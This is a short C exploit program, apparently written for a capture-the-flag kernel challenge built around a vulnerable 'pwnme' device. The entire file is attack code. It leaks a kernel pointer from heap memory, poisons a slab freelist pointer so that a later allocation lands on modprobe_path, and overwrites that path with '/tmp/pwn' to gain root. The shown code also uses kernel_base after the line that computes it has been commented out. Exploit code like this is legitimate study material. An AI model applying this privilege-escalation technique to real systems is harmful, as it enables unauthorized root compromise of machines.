#include "libpwn.c"

int main(){
  fd = pwnme_open();

  char *buffer = malloc(0x2800);
  pwnme_read(fd, buffer, 0x2800);
  dump_hex(buffer, 0x2800);
  leak = ((unsigned long *)buffer)[1119];
  // kernel_base = leak - 0x693559;
  size_t modprobe_path = KADDR(0xffffffff818ae3c0);
  info("leak", leak);
  info("kernel base", kernel_base);
  info("modprobe_path", modprobe_path);
  ppause();

  // Overwrite free pointer to modprobe_path
  ((unsigned long *)buffer)[6] = modprobe_path;
  pwnme_write(fd, buffer, 0x38);

  fd = pwnme_open(); // kmalloc 0x20
  fd = pwnme_open(); // kmalloc 0x20

  char target[] = "/tmp/pwn\0";
  pwnme_write(fd, target, sizeof(target));

  pwnme_read(fd, buffer, 0x100);
  dump_hex(buffer, 0x100);

  ppause();
  modprobe_attack_root();
  return 0;
}